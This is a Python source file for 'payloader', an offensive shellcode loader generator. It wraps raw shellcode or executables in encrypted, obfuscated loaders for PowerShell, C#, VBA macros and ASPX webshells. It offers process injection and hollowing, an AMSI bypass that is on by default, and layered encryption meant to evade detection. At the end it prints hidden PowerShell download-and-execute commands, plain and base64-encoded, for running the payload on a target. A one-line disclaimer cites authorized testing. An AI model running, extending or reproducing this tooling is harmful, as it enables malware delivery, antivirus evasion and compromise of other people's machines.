#!/usr/bin/env python3
"""
payloader – Multi-format shellcode payload generator.

Generates ready-to-use loaders in PowerShell, C#, VBA, ASPX, and raw binary
with support for XOR, AES-256-CBC, RC4, ROT-N, and multi-layer chaining.

DISCLAIMER: For authorized security testing and educational use only.
"""

import sys
import os
import socket
import base64
import random

# ---------------------------------------------------------------------------
# Optional donut import
# ---------------------------------------------------------------------------
try:
    import donut as _donut
    DONUT_AVAILABLE = True
except ImportError:
    DONUT_AVAILABLE = False

# ---------------------------------------------------------------------------
# Local modules
# ---------------------------------------------------------------------------
from modules.utils import random_string, generate_key
from modules import crypto
from modules.chain import parse_chain_spec, apply_chain, build_single_stage
from modules.generators import ps1 as gen_ps1
from modules.generators import vba as gen_vba
from modules.generators import cs as gen_cs
from modules.generators import aspx as gen_aspx
from modules.generators import raw as gen_raw

WEB_PORT = 80


# ---------------------------------------------------------------------------
# Donut helpers  (unchanged from original)
# ---------------------------------------------------------------------------

def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        return s.getsockname()[0]
    except Exception:
        return '127.0.0.1'
    finally:
        s.close()


def is_exe_file(filepath: str) -> bool:
    if not os.path.exists(filepath):
        return False
    ext = os.path.splitext(filepath)[1].lower()
    if ext in ('.exe', '.dll'):
        return True
    try:
        with open(filepath, 'rb') as f:
            return f.read(2) == b'MZ'
    except Exception:
        return False


def convert_exe_to_shellcode(exe_path: str, arch: int = 3,
                              bypass: int = 3, params: str = '') -> bytes:
    if not DONUT_AVAILABLE:
        print("[!] donut not installed: pip3 install donut-shellcode")
        sys.exit(1)
    arch_label = ['', 'x86', 'amd64', 'x86+amd64'][arch]
    bypass_label = ['', 'none', 'abort on fail', 'continue on fail'][bypass]
    print(f"[*] Converting {exe_path} to shellcode via donut (arch={arch_label}, bypass={bypass_label})")
    try:
        sc = _donut.create(file=exe_path, arch=arch, bypass=bypass, params=params)
        print(f"[+] Shellcode: {len(sc)} bytes")
        return sc
    except Exception as e:
        print(f"[!] donut error: {e}")
        sys.exit(1)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def print_help():
    name = os.path.basename(sys.argv[0])
    print(f"""
{'='*65}
payloader – Multi-format Shellcode Payload Generator
{'='*65}

USAGE:
    python3 {name} <file> [options]
    python3 {name} -h | --help

ARGUMENTS:
    <file>              Shellcode (.bin) or executable (.exe/.dll)

ENCRYPTION:
    --encryption ALGO   Single algorithm: XOR, AES256, RC4, ROT
                        Default: XOR
    --key VALUE         Encryption key (e.g. 0xAA, 0xDEADBEEF, "secret")
    --iv VALUE          IV for AES-256-CBC (16 bytes, default: random)
    --rot-n N           ROT-N rotation value (default: 13)
    --chain SPEC        Multi-layer chain spec (overrides --encryption):
                          "xor:KEY=0xAA,aes256:KEY=s3cr3t,rot:N=13"
                        Params within a stage separated by semicolons.

OUTPUT FORMAT:
    --output-format FMT Comma-separated list: ps1,cs,vba,aspx,bin
                        Default: ps1
    --injection-method  For C# output: valloc,pinject,ntinject,hollow
                        Default: valloc
    --target-process    Process name for pinject/ntinject/hollow
                        Default: explorer

POWERSHELL OPTIONS:
    -l, --level N       Obfuscation level 1-5 (default: 3)
    --obfuscation-level N  Alias for -l/--level
    -o, --obfuscate     Enable PS obfuscation (default: on)
    --no-obfuscate      Disable PS obfuscation
    -d, --debug         Emit diagnostic Write-Host lines
    --bypass-amsi       Include AMSI bypass (default: always included)

DONUT OPTIONS (for .exe/.dll files):
    -a, --arch ARCH     1=x86  2=amd64  3=x86+amd64 (default: 3)
    -b, --bypass N      1=none 2=abort  3=continue   (default: 3)
    -p, --params "..."  Command line params for the executable

EXAMPLES:
    # XOR-encrypted PowerShell loader (default)
    python3 {name} shellcode.bin

    # AES-256 C# loader with remote-thread injection
    python3 {name} shellcode.bin --encryption AES256 --key "MySecret" \\
        --output-format cs --injection-method pinject

    # Multi-layer chain → PS1 + VBA
    python3 {name} shell.bin --chain "xor:KEY=0xAA,rc4:KEY=mykey,rot:N=13" \\
        --output-format ps1,vba

    # ROT-13 ASPX webshell payload
    python3 {name} shell.bin --encryption ROT --rot-n 13 --output-format aspx

    # Raw encrypted binary for custom loaders
    python3 {name} shell.bin --encryption RC4 --key 0xDEADBEEF --output-format bin

    # From .exe with obfuscation level 5
    python3 {name} implant.exe -l 5 --output-format ps1,cs

    # Quad-layer chain (CerberusObfuscator style)
    python3 {name} shell.bin \\
        --chain "aes256:KEY=layer1,xor:KEY=0xBB,rc4:KEY=layer3,rot:N=7" \\
        --output-format cs

    # Disable obfuscation for debugging
    python3 {name} shell.bin --no-obfuscate -d

VALIDATION:
    python3 tests/validate_chain.py --all
    python3 tests/validate_chain.py --chain "xor:KEY=0xAA,rot:N=13"

TESTS:
    python3 -m pytest tests/ -v
    python3 -m unittest discover tests/
{'='*65}
""")


def parse_args(argv):
    args = {
        'input_file': None,
        'encryption': 'xor',
        'key': None,
        'iv': None,
        'rot_n': 13,
        'chain': None,
        'output_formats': ['ps1'],
        'injection_method': 'valloc',
        'target_process': 'explorer',
        'obfuscation_level': 3,
        'enable_obfuscation': True,
        'enable_debug': False,
        'donut_arch': 3,
        'donut_bypass': 3,
        'donut_params': '',
    }

    i = 1
    while i < len(argv):
        a = argv[i]

        if a in ('-h', '--help', 'help'):
            print_help()
            sys.exit(0)

        # Encryption
        elif a == '--encryption':
            args['encryption'] = argv[i+1].lower(); i += 2; continue
        elif a == '--key':
            args['key'] = argv[i+1]; i += 2; continue
        elif a == '--iv':
            args['iv'] = argv[i+1]; i += 2; continue
        elif a == '--rot-n':
            args['rot_n'] = int(argv[i+1]); i += 2; continue
        elif a == '--chain':
            args['chain'] = argv[i+1]; i += 2; continue

        # Output
        elif a == '--output-format':
            args['output_formats'] = [f.strip().lower() for f in argv[i+1].split(',')]
            i += 2; continue
        elif a == '--injection-method':
            args['injection_method'] = argv[i+1].lower(); i += 2; continue
        elif a == '--target-process':
            args['target_process'] = argv[i+1]; i += 2; continue

        # Obfuscation
        elif a in ('-l', '--level', '--obfuscation-level'):
            level = int(argv[i+1])
            if not 1 <= level <= 5:
                print("[!] Obfuscation level must be 1-5"); sys.exit(1)
            args['obfuscation_level'] = level; i += 2; continue
        elif a in ('-o', '--obfuscate', '--bypass-amsi'):
            args['enable_obfuscation'] = True; i += 1; continue
        elif a == '--no-obfuscate':
            args['enable_obfuscation'] = False; i += 1; continue
        elif a in ('-d', '--debug'):
            args['enable_debug'] = True; i += 1; continue

        # Donut
        elif a in ('-a', '--arch'):
            v = int(argv[i+1])
            if v not in (1, 2, 3):
                print("[!] --arch must be 1, 2, or 3"); sys.exit(1)
            args['donut_arch'] = v; i += 2; continue
        elif a in ('-b', '--bypass'):
            v = int(argv[i+1])
            if v not in (1, 2, 3):
                print("[!] --bypass must be 1, 2, or 3"); sys.exit(1)
            args['donut_bypass'] = v; i += 2; continue
        elif a in ('-p', '--params'):
            args['donut_params'] = argv[i+1]; i += 2; continue

        elif not a.startswith('-'):
            args['input_file'] = a; i += 1; continue
        else:
            print(f"[!] Unknown option: {a}")
            print_help()
            sys.exit(1)

        i += 1

    return args


# ---------------------------------------------------------------------------
# Chain builder from CLI args
# ---------------------------------------------------------------------------

def build_chain_stages(args: dict) -> list[dict]:
    """Translate CLI encryption args into a chain stages list."""
    if args['chain']:
        return parse_chain_spec(args['chain'])

    algo = args['encryption'].lower()
    key = crypto.parse_key(args['key']) if args['key'] else None
    iv  = crypto.parse_key(args['iv'])  if args['iv']  else None
    return [build_single_stage(algo, key=key, iv=iv, rot_n=args['rot_n'])]


# ---------------------------------------------------------------------------
# Output writers
# ---------------------------------------------------------------------------

def write_output(content: str | bytes, filename: str) -> None:
    try:
        if isinstance(content, bytes):
            with open(filename, 'wb') as f:
                f.write(content)
        else:
            with open(filename, 'w') as f:
                f.write(content)
        print(f"[+] Written: {filename}  ({len(content)} bytes)")
    except Exception as e:
        print(f"[!] Error writing {filename}: {e}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args = parse_args(sys.argv)

    if args['input_file'] is None:
        print_help()
        sys.exit(0)

    if not os.path.exists(args['input_file']):
        print(f"[!] File not found: {args['input_file']}")
        sys.exit(1)

    # ---- load / convert shellcode ----------------------------------------
    if is_exe_file(args['input_file']):
        print(f"[*] Detected executable: {args['input_file']}")
        raw_bytes = convert_exe_to_shellcode(
            args['input_file'],
            arch=args['donut_arch'],
            bypass=args['donut_bypass'],
            params=args['donut_params'],
        )
    else:
        print(f"[*] Reading raw shellcode: {args['input_file']}")
        with open(args['input_file'], 'rb') as f:
            raw_bytes = f.read()
    print(f"[+] Input: {len(raw_bytes)} bytes")

    # ---- encryption chain ------------------------------------------------
    stages = build_chain_stages(args)

    algo_summary = ' → '.join(s['algo'].upper() for s in stages)
    print(f"[*] Encrypting with chain: {algo_summary}")

    encrypted_bytes, chain_metadata = apply_chain(raw_bytes, stages)
    print(f"[+] Encrypted: {len(encrypted_bytes)} bytes")

    # ---- per-format generation -------------------------------------------
    output_formats = args['output_formats']
    base_name = random_string(6)
    outputs_generated = []

    for fmt in output_formats:
        try:
            if fmt == 'ps1':
                print(f"\n[*] Generating PowerShell loader...")
                out = gen_ps1.generate(
                    encrypted_bytes, chain_metadata,
                    obfuscation_level=args['obfuscation_level'],
                    enable_obfuscation=args['enable_obfuscation'],
                    enable_debug=args['enable_debug'],
                )
                fname = base_name + '.ps1'
                write_output(out, fname)
                outputs_generated.append(('ps1', fname))

            elif fmt == 'vba':
                print(f"\n[*] Generating VBA macro loader...")
                out = gen_vba.generate(encrypted_bytes, chain_metadata)
                fname = base_name + '.vba'
                write_output(out, fname)
                outputs_generated.append(('vba', fname))

            elif fmt in ('cs', 'csharp'):
                print(f"\n[*] Generating C# loader (method={args['injection_method']})...")
                out = gen_cs.generate(
                    encrypted_bytes, chain_metadata,
                    injection_method=args['injection_method'],
                    target_process=args['target_process'],
                )
                fname = base_name + '.cs'
                write_output(out, fname)
                outputs_generated.append(('cs', fname))

            elif fmt == 'aspx':
                print(f"\n[*] Generating ASPX web payload...")
                out = gen_aspx.generate(encrypted_bytes, chain_metadata)
                fname = base_name + '.aspx'
                write_output(out, fname)
                outputs_generated.append(('aspx', fname))

            elif fmt == 'bin':
                print(f"\n[*] Writing raw encrypted binary...")
                out = gen_raw.generate(encrypted_bytes)
                fname = base_name + '.bin'
                write_output(out, fname)
                outputs_generated.append(('bin', fname))

            else:
                print(f"[!] Unknown output format: '{fmt}'. "
                      "Valid: ps1, vba, cs, aspx, bin")

        except ValueError as e:
            print(f"[!] {fmt}: {e}")
        except Exception as e:
            print(f"[!] Error generating {fmt}: {e}")
            raise

    # ---- summary ---------------------------------------------------------
    print('\n' + '='*65)
    print(f" Generated {len(outputs_generated)} payload(s)")
    print('='*65)
    print(f"  Chain:      {algo_summary}")

    for i, stage in enumerate(chain_metadata):
        algo = stage['algo']
        if algo in ('xor', 'rc4'):
            print(f"  Layer {i+1}: {algo.upper()} key={stage['key'].hex()}")
        elif algo == 'aes256':
            print(f"  Layer {i+1}: AES-256-CBC key={stage['key'].hex()}")
            print(f"           iv ={stage['iv'].hex()}")
        elif algo == 'rot':
            print(f"  Layer {i+1}: ROT-{stage['n']}")

    print()
    for fmt, fname in outputs_generated:
        print(f"  [{fmt.upper():5s}] {fname}")

    # ---- PowerShell delivery commands ------------------------------------
    ps1_outputs = [(fmt, fname) for fmt, fname in outputs_generated if fmt == 'ps1']
    if ps1_outputs:
        my_ip = get_local_ip()
        fname = ps1_outputs[0][1]
        print(f"\n[STEP 1] Start web server:")
        print(f"   sudo python3 -m http.server {WEB_PORT}")

        print(f"\n[STEP 2] Execute on target (direct):")
        print("-"*80)
        print(f'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient)'
              f".DownloadString('http://{my_ip}:{WEB_PORT}/{fname}')\"")
        print("-"*80)

        cmd = (f"IEX (New-Object Net.WebClient)"
               f".DownloadString('http://{my_ip}:{WEB_PORT}/{fname}')")
        enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
        print(f"\n[STEP 3] Base64-encoded command:")
        print("-"*80)
        print(f"powershell -nop -w hidden -enc {enc}")
        print("-"*80)

    print()


if __name__ == '__main__':
    main()
